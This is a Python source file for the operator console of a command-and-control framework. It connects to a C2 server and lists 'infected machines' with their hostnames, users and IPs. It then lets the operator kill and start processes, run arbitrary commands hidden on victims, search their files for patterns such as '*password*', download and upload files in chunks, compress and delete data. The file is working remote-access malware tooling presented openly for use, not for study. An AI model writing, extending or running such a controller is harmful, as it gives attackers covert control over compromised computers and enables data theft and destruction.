import requests
import json
import time
from datetime import datetime
from config import HOST, CHUNK_SIZE
import os

class Controller:
    def __init__(self):
        self.server_url = HOST
        self.current_file_paths = {}
    
    def get_connected_clients(self):
        try:
            print(f"[+] Fetching connected clients from {self.server_url}")
            response = requests.get(f"{self.server_url}/admin/clients", timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                clients = data.get('clients', [])
                
                print(f"[+] ✅ Successfully retrieved {len(clients)} clients")
                return clients


            else:
                print(f"[-] ❌ Server returned {response.status_code}")
                print(f"[-] Response: {response.text}")
                return []
                
        except requests.exceptions.ConnectionError:
            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
            return []

        except Exception as e:
            print(f"[-] ❌ Error fetching clients: {e}")
            return []
    
    
    
    
    def display_clients(self, clients):
        if not clients:
            print("[-] No clients connected")
            return
        
        
        print("\n" + "="*80)
        print("INFECTED MACHINES")
        print("="*80)
        

        online_count = 0
        for i, client in enumerate(clients, 1):
            status = "🟢 ONLINE" if client.get('online') else "🔴 OFFLINE"
            if client.get('online'):
                online_count += 1
            
            system_info = client.get('system_info', {})
            platform_name = system_info.get('platform', 'Unknown')
            hostname = system_info.get('hostname', 'Unknown')
            username = system_info.get('username', 'Unknown')
            
            last_seen = datetime.fromtimestamp(client.get('last_seen', 0))
            uptime = time.strftime('%H:%M:%S', time.gmtime(client.get('uptime_seconds', 0)))
            
            print(f"\n{i}. {client['client_id']}")
            print(f"   Status: {status}")
            print(f"   System: {platform_name} | {hostname} | {username}")
            print(f"   IP: {client.get('ip', 'Unknown')}")
            print(f"   Last Seen: {last_seen}")
            print(f"   Uptime: {uptime}")
            print(f"   Check-ins: {client.get('checkin_count', 0)}")
            print("-" * 80)
        
        print(f"\n SUMMARY: {online_count}/{len(clients)} clients online")
  
  
  
    
    def get_server_status(self):
        try:
            response = requests.get(f"{self.server_url}/admin/status", timeout=5)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}
    
    
    def send_process_command(self, client_id, action, data=None):
        try:
            print(f"[+] Sending command to {client_id}: {action}")

            
            response = requests.post(
                f"{self.server_url}/admin/process/{client_id}",
                json={
                    "action": action,
                    "data": data or {}
                },
                timeout = 40
            )
            
            
            if response.status_code == 200:
                result = response.json()
                command_id = result.get("command_id")
                
                if command_id:
                    print(f"[+] Command queued successfully. Waiting for result...")
                    for attempt in range(12):
                        time.sleep(5)
                        
                        result_response = requests.get(
                            f"{self.server_url}/admin/command_result/{command_id}",
                            timeout = 5
                        )
                        
                        if result_response.status_code == 200:
                            result_data = result_response.json()
                            return result_data.get("result")
                        elif attempt == 11:
                            print("[-] Timeout waiting for command result")
                            return {"error": "Timeout waiting for command execution"}
                
                
                return result
            else:
                print(f"[-] Command failed: {response.status_code} - {response.text}")
                return {"error" : f'Server returned {response.status_code}'}
        
        
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot connect to server")
            return {"error": "Cannot connect to server"}
        except Exception as e:
            print(f"[-] Error sending command: {e}")
            return {"error": f"Command failed: {e}"}
    
    
    
    
    def process_management_menu(self, client_id):
        while True:
            print("\n" + "="*50)
            print(f"PROCESS MANAGEMENT - Client: {client_id}")
            print("="*50)
            print("1. 📋 List all processes")
            print("2. 🌳 View process tree") 
            print("3. 🔍 Get process details")
            print("4. 💀 Kill process")
            print("5. 🚀 Start process")
            print("6. ⚡Execute command")
            print("7. 💻 Get system info")
            print("8. 🔙 Back to main menu")
            
            
            choice = input("\nSelect option(1-8): ").strip()
            
            if choice == "1":
                self.handle_list_processes(client_id)
            elif choice == "2":
                self.handle_process_tree(client_id)
            elif choice == "3":
                self.handle_process_details(client_id)
            elif choice == "4":
                self.handle_kill_process(client_id)
            elif choice == "5":
                self.handle_start_process(client_id)
            elif choice == "6":
                self.handle_execute_command(client_id)
            elif choice == "7":
                self.handle_system_info(client_id)
            elif choice == "8":
                break
            else:
                print("[-] Invalid option")
                
                
    def handle_list_processes(self, client_id):
        print("\n[+] Fetching process list...")
        result = self.send_process_command(client_id, "get_all_processes")
        
        if isinstance(result, list):
            processes = result
            print(f"\n[+] Found {len(processes)} processes: ")
            print("-" * 100)
            print(f"{'PID':<8} {'Name':<20} {'User':<15} {'CPU%':<6} {'Memory%':<8} {'Status':<10}")
            print("-" * 100)
            
            for proc in processes[:50]:
                pid = proc.get('pid', 'N/A')
                name = proc.get('name', 'N/A')[:18]
                username = proc.get('username', 'N/A')[:13]
                cpu = proc.get('cpu_percent', 'N/A')
                memory = proc.get('memory_percent', 'N/A')
                status = proc.get('status', 'N/A')[:8]
                
                print(f"{pid:<8} {name:<20} {username:<15} {cpu:<6} {memory:<8} {status:<10}")
            
            if len(processes) > 50:
                print(f"\n[!] Showing 50 out of {len(processes)} processes")
        
        elif isinstance(result, dict) and result.get("error"):
            error = result.get('error', 'Unknown error')
            print(f"[-] Failed to get processes: {error}")
        else:
            print(f"[-] Unexpected response format: {result}")
        
        
    
    def handle_process_tree(self, client_id):
        print("\n[+] Fetching process tree...")
        result = self.send_process_command(client_id, "get_process_tree")
        
        if isinstance(result, list):
            self.display_process_tree(result, level=0)
        elif isinstance(result, dict) and result.get("error"):
            error = result.get("error", "Unknown error")
            print(f"[-] Failed to get process tree: {error}")
        else:
            print(f"[-] Unexpected response format: {result}")
  
  
    
    def display_process_tree(self, tree, level=0):
        if not tree:
            print("  (No processes found)")
            return
            
        indent = "  " * level
        
        if isinstance(tree, list):
            for node in tree:
                self.display_process_tree(node, level)
        
        elif isinstance(tree, dict):
            pid = tree.get("pid", "N/A")
            name = tree.get("name", "N/A")
            username = tree.get("username", "N/A")
            
            print(f"{indent}├─ {name} (PID: {pid}, User: {username})")
            
            children = tree.get('children', [])
            for child in children:
                self.display_process_tree(child, level + 1)
    
    
    
    def handle_process_details(self, client_id):
        pid = input("Enter PID: ").strip()
        
        if pid.isdigit():
            print(f"\n[+] Getting details for PID {pid}...")
            result = self.send_process_command(client_id, "get_process_details", {"pid": int(pid)})
            
            
            if result and not result.get("error"):
                print("\n" + "="*50)
                print(f"PROCESS DETAILS - PID: {pid}")
                print("=" * 50)
                
                
                keys_to_display = ['name', 'status', 'username', 'ppid', 'cpu_percent', 'memory_percent', 'num_threads', 'exe', 'command_line']
                
                for key in keys_to_display:
                    value = result.get(key, "N/A")
                    if key == "command_line" and isinstance(value, list):
                        value = ' '.join(value)
                    print(f"{key.replace('_', ' ').title():<15}: {value}")
                
                
            #EXTRA
                if 'connections' in result and result['connections']:
                    print(f"\nNetwork Connections: {len(result['connections'])}")
                if 'open_files' in result and result['open_files']:
                    print(f"Open Files: {len(result['open_files'])}")
            
            else:
                error = result.get("error", "Unknown error") if result else 'No response'
                print(f"[-] Failed to get process details: {error}")
        
        else:
            print("[-] Invalid PID")
    
    
    def handle_kill_process(self, client_id):
        pid = input("Enter PID to kill: ").strip()
        if pid.isdigit():
            confirm = input(f"Are you sure you want to kill process {pid}? (y/n): ").strip().lower()
            if confirm == 'y':
                print(f"\n[+] Killing process {pid}...")
                result = self.send_process_command(client_id, "kill_process", {"pid": int(pid)})
                
                if result and result.get('success'):
                    print(f"[+] {result.get('message', 'Process killed successfully')}")
                else:
                    error = result.get('error', 'Unknown error') if result else 'No response'
                    print(f"[-] Failed to kill process: {error}")
            else:
                print("[!] Operation cancelled")
        else:
            print("[-] Invalid PID")
    

    def handle_start_process(self, client_id):
        command = input("Enter command to start: ").strip()
        if command:
            hidden = input("Run hidden? (y/n): ").strip().lower() == 'y'
            
            print(f"\n[+] Starting process: {command}")
            result = self.send_process_command(client_id, "start_process", {
                "command": command.split(),
                "hidden": hidden
            })
            
            if result and result.get('success'):
                pid = result.get('pid', 'Unknown')
                print(f"[+] Process started successfully (PID: {pid})")
                print(f"    Message: {result.get('message', '')}")
            else:
                error = result.get('error', 'Unknown error') if result else 'No response'
                print(f"[-] Failed to start process: {error}")
        else:
            print("[-] No command provided")
            
    
    def handle_execute_command(self, client_id):
        command = input("Enter command to execute: ").strip()
        if command:
            hidden = input("Run hidden? (y/n): ").strip().lower() == 'y'
            working_dir = input("Working directory (press Enter for current): ").strip()
            working_dir = working_dir if working_dir else None
            
            
            print(f"\n[+] Executing command: {command}")
            result = self.send_process_command(client_id, "execute_command", {
                "command": command,
                "hidden": hidden,
                "working_dir": working_dir
            })
            
            if result and result.get('success'):
                print(f"[+] Command executed successfully!")
                print(f" Exit Code: {result.get('exit_code', 'N/A')}")
                

                stdout = result.get('stdout', '').strip()
                stderr = result.get('stderr', '').strip()
                
                if stdout:
                    print(f" Output:\n{stdout}")
                if stderr:
                    print(f" Errors:\n{stderr}")
                    
                print(f" Message: {result.get('message', '')}")
            else:
                error = result.get('error', 'Unknown error') if result else 'No response'
                print(f"[-] Failed to execute command: {error}")
        else:
            print("[-] No command provided")
    
    
    def handle_system_info(self, client_id):
        print("\n[+] Fetching system information...")
        result = self.send_process_command(client_id, "get_system_info")
        
        if result and not result.get('error'):
            print("\n" + "="*50)
            print("SYSTEM INFORMATION")
            print("="*50)
            
            #Display basic system info
            basic_info = [
                'platform', 'hostname', 'architecture', 'kernel', 'boot_time'
            ]
            
            for key in basic_info:
                value = result.get(key, 'N/A')
                print(f"{key.replace('_', ' ').title():<15}: {value}")
            
            #Display CPU info
            if 'cpu' in result:
                cpu = result['cpu']
                print(f"\nCPU Information:")
                print(f"  Model: {cpu.get('model', 'N/A')}")
                print(f"  Cores: {cpu.get('physical_cores', 'N/A')} physical, {cpu.get('logical_cores', 'N/A')} logical")
                if 'cpu_usage' in cpu:
                    usage = cpu['cpu_usage']
                    if isinstance(usage, list):
                        print(f"  CPU Usage: {len(usage)} cores")
                    else:
                        print(f"  CPU Usage: {usage}%")
            
            #Display Memory info
            if 'memory' in result:
                memory = result['memory']
                total_gb = memory.get('total', 0) / (1024**3)
                available_gb = memory.get('available', 0) / (1024**3)
                percent = memory.get('percent', 0)
                
                print(f"\nMemory Information:")
                print(f"  Total: {total_gb:.2f} GB")
                print(f"  Available: {available_gb:.2f} GB")
                print(f"  Usage: {percent}%")
                
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to get system info: {error}")
    
    
    
    
    
    
    def send_file_command(self, client_id, action, data=None):
        try:
            print(f"[+] Sending file command to {client_id}: {action}")
            
            response = requests.post(
                f"{self.server_url}/admin/file/{client_id}",
                json={
                    "action": action,
                    "data": data or {}
                },
                timeout=120
            )
            
            if response.status_code == 200:
                result = response.json()
                command_id = result.get("command_id")
                
                if command_id:
                    print(f"[+] File command queued successfully. Waiting for result...")
                    for attempt in range(30): #Wait up to 150 seconds for file operations
                        time.sleep(5)
                        
                        result_response = requests.get(
                            f"{self.server_url}/admin/command_result/{command_id}",
                            timeout=10
                        )
                        
                        if result_response.status_code == 200:
                            result_data = result_response.json()
                            return result_data.get("result")
                        elif attempt == 29:
                            print("[-] Timeout waiting for file command result")
                            return {"error": "Timeout waiting for file operation"}
                
                return result
            else:
                print(f"[-] File command failed: {response.status_code} - {response.text}")
                return {"error": f'Server returned {response.status_code}'}
        
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot connect to server")
            return {"error": "Cannot connect to server"}
        except Exception as e:
            print(f"[-] Error sending file command: {e}")
            return {"error": f"File command failed: {e}"}
    
    
    
    def file_manager_menu(self, client_id):
        current_path = self.current_file_paths.get(client_id, ".")
        
        while True:
            dir_info = self.send_file_command(client_id, "file_list_directory", {"path": current_path})
            if dir_info and dir_info.get("success"):
                current_path = dir_info.get('current_path', current_path)
                item_count = dir_info.get('total_items', 0)
                total_size = self._format_size(dir_info.get("total_size", 0))
            
            else:
                item_count = "Unknown"
                total_size = "Unknown"
                
                
            print("\n" + "="*60)
            print(f"📁 FILE MANAGER - Client: {client_id}")
            print("="*60)
            print(f"📍 Current Path: {current_path}")
            print(f"📊 Contents: {item_count} items, {total_size}")
            
            print("\n1. 📋 List directory")
            print("2. 🔍 Search files")
            print("3. ⬇️  Download file")
            print("4. ⬆️  Upload file")
            print("5. 📦 Compress files")
            print("6. 🗑️  Delete file/directory")
            print("7. 📁 Create directory")
            print("8. 🎯 Change directory")
            print("9. 🔙 Back to main menu")
            
            choice = input("\nSelect option (1-9): ").strip()
            
            if choice == "1":
                self.handle_list_directory(client_id, current_path)
                current_path = self.current_file_paths.get(client_id, current_path)
            elif choice == "2":
                self.handle_file_search(client_id, current_path)
            elif choice == "3":
                self.handle_download_file(client_id, current_path)
            elif choice == "4":
                self.handle_upload_file(client_id, current_path)
            elif choice == "5":
                self.handle_compress_files(client_id, current_path)
            elif choice == "6":
                self.handle_delete_file(client_id, current_path)
            elif choice == "7":
                self.handle_create_directory(client_id, current_path)
                current_path = self.current_file_paths.get(client_id, current_path)
            elif choice == "8":
                current_path = self.handle_change_directory(client_id, current_path)
            elif choice == "9":
                break
            else:
                print("[-] Invalid option")
    
    
    
    def handle_change_directory(self, client_id, current_path):
        new_path = input(f"Enter new directory path (current: {current_path}): ").strip()
        if not new_path:
            return current_path
        

        result = self.send_file_command(client_id, "file_list_directory", {"path": new_path})
        
        if result and result.get("success"):
            new_current_path = result.get("current_path", new_path)
            self.current_file_paths[client_id] = new_current_path
            print(f"[+] Changed to: {new_current_path}")
            return new_current_path
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Cannot change to directory: {error}")
            return current_path
    
    
    
    
    def handle_list_directory(self, client_id, current_path):
        path = input(f"Enter path (current: {current_path}): ").strip() or current_path
        
        print(f"\n[+] Listing directory: {path}")
        result = self.send_file_command(client_id, "file_list_directory", {"path": path})
        
        
        
        
        if result and result.get("success"):
            directory_data = result
            current_path = directory_data.get("current_path", path)
            self.current_file_paths[client_id] = current_path
            
            print(f"\n Directory: {current_path}")
            if directory_data.get("parent_path"):
                print(f" Parent: {directory_data['parent_path']}")
            
            print(f"\n{'Type':<6} {'Permissions':<12} {'Size':<10} {'Modified':<20} {'Name'}")
            print("-" * 80)
            
            items = directory_data.get("items", [])
            for i, item in enumerate(items):
                if item.get("error"):
                    print(f" {i+1:2d}. ERROR: {item['name']} - {item['error']}")
                    continue
                
                item_type = "📁" if item.get("is_directory") else "📄"
                permissions = item.get("permissions", "----------")
                size = self._format_size(item.get("size", 0))
                modified = datetime.fromtimestamp(item.get("modified_time", 0)).strftime("%Y-%m-%d %H:%M:%S")
                name = item["name"]
                
                print(f"{item_type:<4} {i+1:2d}. {permissions:<12} {size:<10} {modified:<20} {name}")
            
            print(f"\nTotal: {directory_data.get('total_items', 0)} items, {self._format_size(directory_data.get('total_size', 0))}")
            



            if items:
                choice = input("\nEnter to navigate into directory, 'p' for parent, or Enter to continue: ").strip()
                if choice.isdigit():
                    index = int(choice) - 1
                    if 0 <= index < len(items):
                        selected_item = items[index]
                        if selected_item.get("is_directory") and not selected_item.get("error"):
                            self.current_file_paths[client_id] = selected_item["path"]
                            self.handle_list_directory(client_id, selected_item["path"])
                elif choice.lower() == 'p' and directory_data.get("parent_path"):
                    self.current_file_paths[client_id] = directory_data["parent_path"]
                    self.handle_list_directory(client_id, directory_data["parent_path"])
        
        
        
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Failed to list directory: {error}")
        
        
        
        
        
    def handle_file_search(self, client_id, current_path):
        root_path = input(f"Search root path (current: {current_path}): ").strip() or current_path
        pattern = input("Search pattern (e.g., *.txt, *password*): ").strip() or "*"
        max_results = input("Max results (default 50): ").strip() or "50"
        
        try:
            max_results = int(max_results)
        except:
            max_results = 50
        
        print(f"\n[+] Searching for '{pattern}' in {root_path}...")
        result = self.send_file_command(client_id, "file_search_files", {
            "root_path": root_path,
            "pattern": pattern,
            "max_results": max_results
        })
        
        if result and result.get("success"):
            search_data = result
            results = search_data.get("results", [])
            
            print(f"\nSearch Results: {len(results)} files found")
            if not search_data.get("search_complete", True):
                print("Search incomplete (hit result limit)")
            
            print(f"\n{'Size':<10} {'Modified':<20} {'Path'}")
            print("-" * 80)
            
            for item in results:
                size = self._format_size(item.get("size", 0))
                modified = datetime.fromtimestamp(item.get("modified_time", 0)).strftime("%Y-%m-%d %H:%M:%S")
                path = item["path"]
                
                print(f"{size:<10} {modified:<20} {path}")
        
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Search failed: {error}")
    
    
    
    
    
    def _format_size(self, size_bytes):
        if size_bytes == 0:
            return "0 B"
        
        size_names = ["B", "KB", "MB", "GB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        
        return f"{size_bytes:.1f} {size_names[i]}"
    


    def handle_download_file(self, client_id, current_path):
        file_path = input(f"File path to download (current: {current_path}): ").strip()
        if not file_path:
            file_path = current_path
        


        if os.path.isdir(file_path) if os.path.exists(file_path) else file_path.endswith('/') or file_path.endswith('\\'):
            print("[-] Please specify a file, not a directory")
            return
        
        local_path = input("Local save path (default: downloaded_file): ").strip() or "downloaded_file"
        
        print(f"\n[+] Downloading {file_path} to {local_path}...")
        



        result = self.send_file_command(client_id, "file_download_chunk", {
            "file_path": file_path,
            "chunk_index": 0
        })
        
        if result and result.get("success"):
            file_size = result.get("file_size", 0)
            total_chunks = result.get("total_chunks", 1)
            
            print(f"[+] File size: {self._format_size(file_size)}, Chunks: {total_chunks}")
            



            with open(local_path, 'wb') as f:
                for chunk_index in range(total_chunks):
                    if chunk_index > 0:  #First chunk already received
                        result = self.send_file_command(client_id, "file_download_chunk", {
                            "file_path": file_path,
                            "chunk_index": chunk_index
                        })
                    
                    if result and result.get("success"):
                        chunk_data_hex = result.get("data", "")
                        if chunk_data_hex:
                            chunk_data = bytes.fromhex(chunk_data_hex)
                            f.write(chunk_data)
                        
                        progress = result.get("progress", "0%")
                        print(f"[+] Download progress: {progress} ({chunk_index + 1}/{total_chunks})")
                        
                        if result.get("is_last"):
                            break
                    else:
                        error = result.get('error', 'Unknown error') if result else 'No response'
                        print(f"[-] Download failed at chunk {chunk_index}: {error}")
                        return
            
            print(f"[+]Download completed: {local_path}")
            
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Download failed: {error}")
        
        
        
        
    def handle_upload_file(self, client_id, current_path):
        local_path = input("Local file path to upload: ").strip()
        if not local_path or not os.path.exists(local_path):
            print("[-] File does not exist")
            return
        
        if not os.path.isfile(local_path):
            print("[-] Please specify a file, not a directory")
            return
        
        remote_path = input(f"Remote path (current: {current_path}): ").strip() or current_path



        if remote_path.endswith('/') or remote_path.endswith('\\') or os.path.isdir(remote_path) if os.path.exists(remote_path) else False:
            remote_path = os.path.join(remote_path, os.path.basename(local_path))
        
        file_size = os.path.getsize(local_path)
        chunk_size = CHUNK_SIZE
        total_chunks = (file_size + chunk_size - 1) // chunk_size
        
        print(f"\n[+] Uploading {local_path} to {remote_path}...")
        print(f"[+] File size: {self._format_size(file_size)}, Chunks: {total_chunks}")
        
        
        
        
        
        with open(local_path, 'rb') as f:
            for chunk_index in range(total_chunks):
                chunk_data = f.read(chunk_size)
                chunk_data_hex = chunk_data.hex()
                is_last = (chunk_index == total_chunks - 1)
                
                result = self.send_file_command(client_id, "file_upload_chunk", {
                    "file_path": remote_path,
                    "chunk_data": chunk_data_hex,
                    "chunk_index": chunk_index,
                    "is_last": is_last
                })
                
                if result and result.get("success"):
                    progress = f"{(chunk_index + 1) / total_chunks * 100:.1f}%"
                    print(f"[+] Upload progress: {progress} ({chunk_index + 1}/{total_chunks})")
                    
                    if is_last:
                        file_size = result.get("file_size", 0)
                        print(f"[+] Upload completed: {remote_path} ({self._format_size(file_size)})")
                else:
                    error = result.get('error', 'Unknown error') if result else 'No response'
                    print(f"[-] Upload failed at chunk {chunk_index}: {error}")
                    return

  
  
    
    def handle_compress_files(self, client_id, current_path):
        print("\nFile Compression")
        print("Enter files/directories to compress (one per line, empty line to finish):")
        
        
        
        files_to_compress = []
        while True:
            file_path = input(f"Path (current: {current_path}): ").strip()
            if not file_path:
                break
            files_to_compress.append(file_path)
        
        if not files_to_compress:
            print("[-] No files specified")
            return
        
        output_path = input("Output zip file path: ").strip()
        if not output_path:
            print("[-] Output path required")
            return
        
        if not output_path.lower().endswith('.zip'):
            output_path += '.zip'
        
        print(f"\n[+] Compressing {len(files_to_compress)} items to {output_path}...")
        result = self.send_file_command(client_id, "file_compress_files", {
            "files": files_to_compress,
            "output_path": output_path
        })
        
        if result and result.get("success"):
            output_size = result.get("output_size", 0)
            compressed_files = result.get("compressed_files", 0)
            message = result.get("message", "")
            
            print(f"[+] Compression completed!")
            print(f"    Output: {output_path}")
            print(f"    Size: {self._format_size(output_size)}")
            print(f"    Files compressed: {compressed_files}")
            if message:
                print(f"    Message: {message}")
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Compression failed: {error}")
    
    
    
    
    def handle_delete_file(self, client_id, current_path):
        target_path = input(f"File/directory to delete (current: {current_path}): ").strip()
        if not target_path:
            target_path = current_path
        


        if target_path in ['/', '\\', 'C:\\', 'C:/']:
            print("[-] Safety check: Cannot delete root directory")
            return
        
        confirm = input(f"Are you sure you want to delete '{target_path}'? (y/n): ").strip().lower()
        if confirm != 'y':
            print("[!] Operation cancelled")
            return
        
        print(f"\n[+] Deleting: {target_path}...")
        result = self.send_file_command(client_id, "file_delete_file", {
            "file_path": target_path
        })
        
        
        
        
        if result and result.get("success"):
            message = result.get("message", "")
            print(f"[+] Delete completed: {message}")
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Delete failed: {error}")
    
    
    
    
    
    def handle_create_directory(self, client_id, current_path):
        dir_path = input(f"New directory path (current: {current_path}): ").strip()
        if not dir_path:
            print("[-] No directory path provided")
            return
        
        
        
        if not os.path.isabs(dir_path):
            dir_path = os.path.join(current_path, dir_path)
        
        
        print(f"\n[+] Creating directory: {dir_path}...")
        result = self.send_file_command(client_id, "file_create_directory", {
            "dir_path": dir_path
        })
        
        
        
        
        if result and result.get("success"):
            message = result.get("message", "")
            print(f"[+] Directory created: {message}")
            print(f"[+] Directory created: {message}")
        else:
            error = result.get('error', 'Unknown error') if result else 'No response'
            print(f"[-] Create directory failed: {error}")
        
    
    
    
    def interactive_mode(self):
        print("\n" + "="*50)
        print("C2 CONTROLLER - INFECTED MACHINES LIST")
        print("="*50)
        

        status = self.get_server_status()
        if status:
            print(f"Server: {self.server_url}")
            print(f"🟢 Status: {status.get('status', 'unknown')}")
            print(f" Total Clients: {status.get('total_clients', 0)}")
            print(f"🟢 Online Now: {status.get('online_clients', 0)}")
        else:
            print(f"Server: {self.server_url}")
            print("🔴 Cannot connect to server")
        
        while True:
            print("\n" + "="*40)
            print("Available Commands:")
            print("1. Refresh client list")
            print("2. Server status") 
            print("3. Manage client processes")
            print("4. File manager")
            print("5. Exit")
            print("="*40)
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                print("\n[+] Fetching client list...")
                clients = self.get_connected_clients()
                self.display_clients(clients)
                
            elif choice == "2":
                status = self.get_server_status()
                if status:
                    print(f"\n SERVER STATUS:")
                    print(f"  Status: {status.get('status', 'unknown')}")
                    print(f"  Total Clients: {status.get('total_clients', 0)}")
                    print(f"  Online Clients: {status.get('online_clients', 0)}")
                    uptime = time.strftime('%H:%M:%S', time.gmtime(status.get('uptime_seconds', 0)))
                    print(f"  Server Uptime: {uptime}")
                else:
                    print("[-] Cannot get server status")
                    
            elif choice == "3":
                clients = self.get_connected_clients()
                online_clients = [c for c in clients if c.get("online")]
                
                if online_clients:
                    print("\n🟢 Online Clients:")
                    
                    for i, client in enumerate(online_clients, 1):
                        system_info = client.get("system_info", {})
                        hostname = system_info.get("hostname", "Unknown")
                        platform_name = system_info.get("platform", "Unknown")
                        print(f"{i}. {client['client_id']} - {hostname} ({platform_name})")
                    
                    
                    client_choice = input("\nSelect client (number): ").strip()
                    if client_choice.isdigit() and 1 <= int(client_choice) <= len(online_clients):
                        selected_client = online_clients[int(client_choice) - 1]
                        self.process_management_menu(selected_client['client_id'])
                    
                    else:
                        print("[-] Invalid client selection")
                else:
                    print("[-] No online clients available")
            elif choice == "4":
                clients = self.get_connected_clients()
                online_clients = [c for c in clients if c.get('online')]
                
                if online_clients:
                    print("\n🟢 Online Clients:")
                    for i, client in enumerate(online_clients, 1):
                        system_info = client.get("system_info", {})
                        hostname = system_info.get("hostname", "Unknown")
                        platform_name = system_info.get("platform", "Unknown")
                        print(f"{i}. {client['client_id']} - {hostname} ({platform_name})")
                    
                    client_choice = input("\nSelect client (number): ").strip()
                    if client_choice.isdigit() and 1 <= int(client_choice) <= len(online_clients):
                        selected_client = online_clients[int(client_choice) - 1]
                        self.file_manager_menu(selected_client['client_id'])
                    else:
                        print("[-] Invalid client selection")
                else:
                    print("[-] No online clients available")
                    
                    
            elif choice == "5":
                print("[+] Exiting controller")
                break
            else:
                print("[-] Invalid option")

if __name__ == "__main__":
    controller = Controller()
    controller.interactive_mode()